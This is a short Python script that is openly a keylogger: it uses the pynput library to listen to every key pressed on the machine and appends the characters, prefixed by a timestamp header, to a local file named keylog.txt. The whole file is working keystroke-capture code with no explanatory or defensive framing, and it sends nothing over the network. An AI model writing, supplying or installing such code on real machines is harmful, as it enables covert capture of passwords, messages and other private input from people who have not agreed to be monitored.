from datetime import datetime

import pynput.keyboard

keys_log = ""


def key_pressed(key):
    """
    handle a key press
    :rtype: object
    """
    with open("keylog.txt", "a") as file:
        try:
            file.write(str(key.char))
        except AttributeError:
            if key == key.space:
                file.write(" ")
            elif key == key.right or key == key.left or key == key.up or key == key.down:
                file.write("")
            else:
                file.write(str(key))
        except Exception as e:
            print(e)


def keylogger_start():
    # init the file
    with open("keylog.txt", "a") as file:
        now = datetime.now()
        file.write("\n----------- Log date: " + str(now) + "-----------\n")

    keyboard_listener = pynput.keyboard.Listener(on_press=key_pressed)
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == '__main__':
    keylogger_start()
